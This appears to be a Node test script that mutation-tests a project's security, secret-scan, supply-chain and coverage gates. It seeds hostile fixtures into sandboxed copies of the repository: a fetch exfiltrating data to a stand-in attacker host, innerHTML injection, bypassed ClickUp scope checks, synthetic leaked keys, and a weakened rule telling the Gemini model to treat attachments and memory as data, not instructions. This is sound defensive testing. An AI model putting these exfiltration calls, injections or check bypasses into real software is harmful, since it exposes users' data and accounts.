import { cpSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, relative, resolve } from 'node:path';
import { spawnSync } from 'node:child_process';

const root = process.cwd();
const checker = resolve(root, 'scripts/check-coverage.mjs');
const coverageSandbox = mkdtempSync(join(tmpdir(), 'elara-coverage-gate-'));
const metrics = ['lines', 'statements', 'functions', 'branches'];
const sourcePath = resolve(coverageSandbox, 'src/example.ts');

function metric(pct) { return { total: 100, covered: pct, skipped: 0, pct }; }
function perfectFileCoverage() {
  return Object.fromEntries(metrics.map((name) => [name, metric(100)]));
}
function writeFixture(branchPct, includeSourceEntry = true) {
  mkdirSync(join(coverageSandbox, 'coverage'), { recursive: true });
  mkdirSync(join(coverageSandbox, 'scripts'), { recursive: true });
  mkdirSync(join(coverageSandbox, 'src'), { recursive: true });
  writeFileSync(sourcePath, 'export const sentinel = 1;\n');
  writeFileSync(join(coverageSandbox, 'coverage/coverage-summary.json'), JSON.stringify({
    total: {
      lines: metric(100),
      statements: metric(100),
      functions: metric(100),
      branches: metric(branchPct),
    },
    ...(includeSourceEntry ? { [sourcePath]: perfectFileCoverage() } : {}),
  }));
  writeFileSync(join(coverageSandbox, 'scripts/coverage-baseline.json'), JSON.stringify({
    version: 1,
    global: Object.fromEntries(metrics.map((name) => [name, 100])),
    directories: {},
    files: {},
  }));
}

function runNode(cwd, script) {
  return spawnSync(process.execPath, [resolve(cwd, script)], {
    cwd,
    encoding: 'utf8',
    env: { ...process.env, CI: 'true' },
  });
}

function runChecker() {
  return spawnSync(process.execPath, [checker], { cwd: coverageSandbox, encoding: 'utf8' });
}

const ignoredCopyRoots = new Set([
  '.git', 'node_modules', 'dist', 'coverage', 'playwright-report', 'test-results', 'dev-dist', '.wrangler',
]);

function cloneRepository(label) {
  const sandbox = mkdtempSync(join(tmpdir(), `elara-pass5-${label}-`));
  cpSync(root, sandbox, {
    recursive: true,
    filter(source) {
      const rel = relative(root, source).replaceAll('\\', '/');
      if (!rel) return true;
      return !ignoredCopyRoots.has(rel.split('/')[0]);
    },
  });
  return sandbox;
}

function writeRelative(cwd, path, content) {
  const absolute = join(cwd, path);
  mkdirSync(dirname(absolute), { recursive: true });
  writeFileSync(absolute, content);
}

function mutateRelative(cwd, path, mutate) {
  const absolute = join(cwd, path);
  writeFileSync(absolute, mutate(readFileSync(absolute, 'utf8')));
}

const failures = [];
const adversarialCases = [];

function addMutation(name, gate, expected, mutate) {
  adversarialCases.push({ name, gate, expected, mutate });
}

function expectBaseline(gate) {
  const result = runNode(root, gate);
  if (result.status !== 0) {
    failures.push(`baseline gate failed before mutation: ${gate}\n${result.stderr || result.stdout}`);
  }
}

function exerciseMutation(testCase) {
  const sandbox = cloneRepository(testCase.name.replace(/[^a-z0-9]+/gi, '-').toLowerCase());
  try {
    testCase.mutate(sandbox);
    const result = runNode(sandbox, testCase.gate);
    const output = `${result.stderr || ''}\n${result.stdout || ''}`;
    if (result.status === 0) {
      failures.push(`${testCase.name}: gate accepted the deliberate mutation`);
      return;
    }
    if (testCase.expected && !output.includes(testCase.expected)) {
      failures.push(`${testCase.name}: gate rejected the mutation for the wrong reason\n${output}`);
    }
  } finally {
    rmSync(sandbox, { recursive: true, force: true });
  }
}

try {
  writeFixture(100);
  const green = runChecker();
  if (green.status !== 0) {
    throw new Error(`coverage checker rejected its green control fixture:\n${green.stderr || green.stdout}`);
  }

  // Controlled mutation 1: one protected metric falls below the certified floor.
  writeFixture(99);
  const metricMutation = runChecker();
  if (metricMutation.status === 0) throw new Error('coverage checker accepted a deliberately regressed branch metric');
  if (!metricMutation.stderr.includes('global branches coverage regressed')) {
    throw new Error(`coverage checker rejected metric mutation for the wrong reason:\n${metricMutation.stderr || metricMutation.stdout}`);
  }

  // Controlled mutation 2: the source file still exists, but the coverage
  // provider silently omits it. This is the exact failure mode that once hid
  // src/pwa.ts from the whole-source report.
  writeFixture(100, false);
  const inventoryMutation = runChecker();
  if (inventoryMutation.status === 0) throw new Error('coverage checker accepted a deliberately missing source entry');
  if (!inventoryMutation.stderr.includes('eligible source disappeared from coverage report: src/example.ts')) {
    throw new Error(`coverage checker rejected source-inventory mutation for the wrong reason:\n${inventoryMutation.stderr || inventoryMutation.stdout}`);
  }

  const gates = [
    'scripts/security-architecture-gate.mjs',
    'scripts/secret-scan.mjs',
    'scripts/check-verification-integrity.mjs',
    'scripts/supply-chain-gate.mjs',
    'scripts/reliability-gate.mjs',
  ];
  for (const gate of gates) expectBaseline(gate);

  addMutation('raw HTML assignment', 'scripts/security-architecture-gate.mjs', 'direct HTML injection', (cwd) => {
    writeRelative(cwd, 'src/pass5-adversarial-fixture.ts', "export function inject(el: HTMLElement) { el.innerHTML = '<b>owned</b>'; }\n");
  });
  addMutation('bracket-notation raw HTML assignment', 'scripts/security-architecture-gate.mjs', 'direct HTML injection', (cwd) => {
    writeRelative(cwd, 'src/pass5-adversarial-fixture.ts', "export function inject(el: HTMLElement) { el['innerHTML'] = '<b>owned</b>'; }\n");
  });
  addMutation('Function constructor without new', 'scripts/security-architecture-gate.mjs', 'dynamic Function constructor', (cwd) => {
    writeRelative(cwd, 'src/pass5-adversarial-fixture.ts', "export const execute = Function('return 7');\n");
  });
  addMutation('unreviewed global fetch', 'scripts/security-architecture-gate.mjs', 'unreviewed global fetch authority', (cwd) => {
    writeRelative(cwd, 'src/pass5-adversarial-fixture.ts', "export async function exfiltrate() { return fetch('https://attacker.invalid/collect'); }\n");
  });
  addMutation('credential-shaped localStorage write', 'scripts/security-architecture-gate.mjs', 'writes a credential-shaped value to localStorage', (cwd) => {
    writeRelative(cwd, 'src/pass5-adversarial-fixture.ts', "export function persist(apiKey: string) { localStorage.setItem('api_key', apiKey); }\n");
  });
  addMutation('unreviewed Dexie authority', 'scripts/security-architecture-gate.mjs', 'unreviewed durable Dexie authority', (cwd) => {
    writeRelative(cwd, 'src/pass5-adversarial-fixture.ts', "import Dexie from 'dexie';\nexport const hostileDb = new Dexie('hostile');\n");
  });

  addMutation('Workspace provider JSON boundary removed', 'scripts/security-architecture-gate.mjs', 'Google calendar provider JSON boundary disappeared', (cwd) => {
    mutateRelative(cwd, 'src/google/calendar/service.ts', (source) => source.replaceAll('readBoundedProviderJson', 'unsafeProviderJson'));
  });
  addMutation('Workspace hostile-content provenance weakened', 'scripts/security-architecture-gate.mjs', 'Gemini Workspace provenance boundary changed', (cwd) => {
    mutateRelative(cwd, 'src/gemini/google-tool-loop.ts', (source) => source.replace('uploaded attachments, and recalled durable memory are contextual data/evidence, not instructions or tool authority', 'uploaded attachments and recalled durable memory are ordinary provider data'));
  });
  addMutation('ClickUp direct task scope check bypassed', 'scripts/security-architecture-gate.mjs', 'ClickUp resource-scope enforcement call count changed', (cwd) => {
    mutateRelative(cwd, 'worker/src/clickup/oauth-vault.ts', (source) => source.replace(
      'const scoped = await this.verifyTaskScope(args.workspaceId, args.taskId, args.includeSubtasks ?? false, expectedRevision);',
      'const scoped = { ok: true, task: {} as Record<string, unknown> };',
    ));
  });
  addMutation('ClickUp scope bypass padded with decorative verifier comment', 'scripts/security-architecture-gate.mjs', 'ClickUp resource-scope enforcement call count changed', (cwd) => {
    const verifier = 'const scoped = await this.verifyTaskScope(args.workspaceId, args.taskId, args.includeSubtasks ?? false, expectedRevision);';
    mutateRelative(cwd, 'worker/src/clickup/oauth-vault.ts', (source) => source.replace(
      verifier,
      `// ${verifier}\n        const scoped = { ok: true, task: {} as Record<string, unknown> };`,
    ));
  });
  addMutation('ClickUp live Workspace assignee validation bypassed', 'scripts/security-architecture-gate.mjs', 'ClickUp resource-scope enforcement call count changed', (cwd) => {
    mutateRelative(cwd, 'worker/src/clickup/oauth-vault.ts', (source) => source.replace(
      'const invalidAssignees = await this.validateFreshWorkspaceUsers(args.workspaceId, args.assigneeIds, expectedRevision);',
      'const invalidAssignees = null;',
    ));
  });
  addMutation('ClickUp assignee resolution regresses to stale OAuth-time membership', 'scripts/security-architecture-gate.mjs', 'ClickUp assignee resolution must use live Workspace membership', (cwd) => {
    mutateRelative(cwd, 'worker/src/clickup/tool-service.ts', (source) => source.replace(
      "operation: 'getWorkspaceAuthorizationContext'",
      "operation: 'getAuthorizationContext'",
    ));
  });
  addMutation('ClickUp tainted mutation intent bypassed', 'scripts/security-architecture-gate.mjs', 'ClickUp untrusted mutation admission lost fresh-user intent check', (cwd) => {
    mutateRelative(cwd, 'src/gemini/google-tool-loop.ts', (source) => source.replace(
      '&& !freshUserExplicitlyRequestedClickUpMutation(request, call.name)',
      '&& false',
    ));
  });
  addMutation('ClickUp task-comments scope check bypassed with helper left intact', 'scripts/security-architecture-gate.mjs', 'ClickUp resource-scope enforcement call count changed', (cwd) => {
    mutateRelative(cwd, 'worker/src/clickup/oauth-vault.ts', (source) => source.replace(
      "case 'getTaskComments': {\n        const scoped = await this.verifyTaskScope(command.workspaceId, command.taskId, false, expectedRevision);",
      "case 'getTaskComments': {\n        const scoped = { ok: true, task: {} as Record<string, unknown> };",
    ));
  });
  addMutation('ClickUp direct-list scope check bypassed with verifier still present', 'scripts/security-architecture-gate.mjs', 'ClickUp resource-scope enforcement call count changed', (cwd) => {
    mutateRelative(cwd, 'worker/src/clickup/oauth-vault.ts', (source) => source.replace(
      "case 'getList': {\n        const scoped = await this.verifyListScope(command.workspaceId, command.listId, expectedRevision);",
      "case 'getList': {\n        const scoped = { ok: true, list: {} as Record<string, unknown> };",
    ));
  });
  addMutation('ClickUp comment-to-task association bypassed', 'scripts/security-architecture-gate.mjs', 'ClickUp resource-scope enforcement call count changed', (cwd) => {
    mutateRelative(cwd, 'worker/src/clickup/oauth-vault.ts', (source) => source.replace(
      'const commentScope = await this.verifyCommentBelongsToTask(args.workspaceId, args.taskId, args.commentId, expectedRevision);',
      'const commentScope = { ok: true as const };',
    ));
  });
  addMutation('ClickUp Custom Field clear drops admitted grant revision', 'scripts/security-architecture-gate.mjs', 'ClickUp Custom Field grant propagation boundary disappeared', (cwd) => {
    mutateRelative(cwd, 'worker/src/clickup/tool-service.ts', (source) => source.replace(
      "fieldId: value.fieldId,\n          }, expectedRevision)",
      "fieldId: value.fieldId,\n          })",
    ));
  });
  addMutation('ClickUp Custom Field set drops admitted grant revision', 'scripts/security-architecture-gate.mjs', 'ClickUp Custom Field grant propagation boundary disappeared', (cwd) => {
    mutateRelative(cwd, 'worker/src/clickup/tool-service.ts', (source) => source.replace(
      "value: value.value,\n          }, expectedRevision)",
      "value: value.value,\n          })",
    ));
  });
  addMutation('ClickUp attachment drops Workspace scope from multipart', 'scripts/security-architecture-gate.mjs', 'ClickUp attachment scope/approval boundary disappeared', (cwd) => {
    mutateRelative(cwd, 'src/clickup/attachment-upload.ts', (source) => source.replace(
      "  form.set('workspaceId', args.workspaceId);\n",
      '',
    ));
  });
  addMutation('ClickUp live catalog comparison bypassed', 'scripts/security-architecture-gate.mjs', 'ClickUp live catalog admission disappeared', (cwd) => {
    mutateRelative(cwd, 'worker/src/clickup/mcp-route.ts', (source) => source.replace(
      'if (!presentedCatalog || presentedCatalog !== liveCatalog)',
      'if (false)',
    ));
  });

  addMutation('synthetic Google API key leak', 'scripts/secret-scan.mjs', 'possible Google API key', (cwd) => {
    const token = 'AIza' + 'A'.repeat(35);
    writeRelative(cwd, 'src/pass5-secret-fixture.ts', `export const leaked = '${token}';\n`);
  });
  addMutation('synthetic private key leak', 'scripts/secret-scan.mjs', 'possible Private key material', (cwd) => {
    const header = ['-----BEGIN', 'PRIVATE', 'KEY-----'].join(' ');
    writeRelative(cwd, 'src/pass5-private-key-fixture.txt', `${header}\nnot-a-real-key\n`);
  });

  addMutation('disabled unit test', 'scripts/check-verification-integrity.mjs', 'contains a disabled, focused, or expected-failure test control', (cwd) => {
    writeRelative(cwd, 'src/pass5-adversarial.test.ts', "import { test } from 'vitest';\ntest.skip('must run', () => {});\n");
  });
  addMutation('Playwright passWithNoTests', 'scripts/check-verification-integrity.mjs', 'Playwright must not allow an empty test suite', (cwd) => {
    mutateRelative(cwd, 'playwright.config.ts', (source) => source.replace("  testDir: './e2e',", "  testDir: './e2e',\n  passWithNoTests: true,"));
  });
  addMutation('E2E imports application source directly', 'scripts/check-verification-integrity.mjs', 'imports application source directly instead of driving a public/user boundary', (cwd) => {
    writeRelative(cwd, 'e2e/pass5-adversarial.spec.ts', "import '../src/app/App';\n");
  });
  addMutation('security gate control removed', 'scripts/check-verification-integrity.mjs', 'security architecture gate lost required capability check', (cwd) => {
    mutateRelative(cwd, 'scripts/security-architecture-gate.mjs', (source) => source.replace('XMLHttpRequest transport', 'XMLHttpRequest channel'));
  });
  addMutation('secret detector control removed', 'scripts/check-verification-integrity.mjs', 'secret scanner lost required detector or fixture policy', (cwd) => {
    mutateRelative(cwd, 'scripts/secret-scan.mjs', (source) => source.replace('GitHub token', 'GitHub credential'));
  });
  addMutation('supply-chain audit control removed', 'scripts/check-verification-integrity.mjs', 'supply-chain gate lost required control', (cwd) => {
    mutateRelative(cwd, 'scripts/supply-chain-gate.mjs', (source) => source.replace('npm audit signatures', 'npm signature audit'));
  });

  addMutation('unpinned GitHub Action', 'scripts/supply-chain-gate.mjs', 'GitHub Action is not pinned to a full SHA', (cwd) => {
    mutateRelative(cwd, '.github/workflows/ci.yml', (source) => source.replace('actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1', 'actions/checkout@v7'));
  });
  addMutation('checkout persists credentials', 'scripts/supply-chain-gate.mjs', 'every checkout must use an exact resolved SHA and persist-credentials: false', (cwd) => {
    mutateRelative(cwd, '.github/workflows/ci.yml', (source) => source.replace('persist-credentials: false', 'persist-credentials: true'));
  });
  addMutation('runtime job gains repository write authority', 'scripts/supply-chain-gate.mjs', 'runtime verification job may not have repository write authority', (cwd) => {
    mutateRelative(cwd, '.github/workflows/ci.yml', (source) => source.replace('      contents: read\n    steps:', '      contents: write\n    steps:'));
  });
  addMutation('deploy job gains unrelated write authority', 'scripts/supply-chain-gate.mjs', 'deploy job permissions changed from the reviewed minimum', (cwd) => {
    mutateRelative(cwd, '.github/workflows/ci.yml', (source) => source.replace('      id-token: write\n    environment:', '      id-token: write\n      issues: write\n    environment:'));
  });
  addMutation('visual evidence becomes automatic PR CI', 'scripts/supply-chain-gate.mjs', 'visual evidence must not run automatically on PR or push events', (cwd) => {
    mutateRelative(cwd, '.github/workflows/visual-evidence.yml', (source) => source.replace(
      "  issue_comment:\n    types: [created]\n",
      "  pull_request:\n    branches: [main]\n",
    ));
  });
  addMutation('deploy no longer depends on runtime certification', 'scripts/supply-chain-gate.mjs', 'Pages deploy must depend on Runtime verification', (cwd) => {
    mutateRelative(cwd, '.github/workflows/ci.yml', (source) => source.replace(
      "  deploy:\n    name: Deploy certified Pages artifact\n    if: github.event_name == 'push' && github.ref == 'refs/heads/main'\n    needs: runtime\n",
      "  deploy:\n    name: Deploy certified Pages artifact\n    if: github.event_name == 'push' && github.ref == 'refs/heads/main'\n",
    ));
  });
  addMutation('mutable npm install in CI', 'scripts/supply-chain-gate.mjs', 'workflows may not use npm install; use npm ci', (cwd) => {
    mutateRelative(cwd, '.github/workflows/ci.yml', (source) => source.replace('npm ci --no-audit --no-fund', 'npm install'));
  });

  addMutation('floating Node baseline', 'scripts/reliability-gate.mjs', 'Node baseline must remain 24.21.0', (cwd) => {
    writeRelative(cwd, '.nvmrc', '24\n');
  });

  for (const testCase of adversarialCases) exerciseMutation(testCase);

  if (failures.length) {
    throw new Error(`Pass 6 adversarial certification failed (${failures.length}):\n${failures.map((failure) => `- ${failure}`).join('\n')}`);
  }

  process.stdout.write(`Coverage + Pass 6 adversarial sentinel passed: green controls accepted; deliberate metric regression and source-inventory disappearance rejected; ${adversarialCases.length} hostile mutations failed closed.\n`);
} finally {
  rmSync(coverageSandbox, { recursive: true, force: true });
}
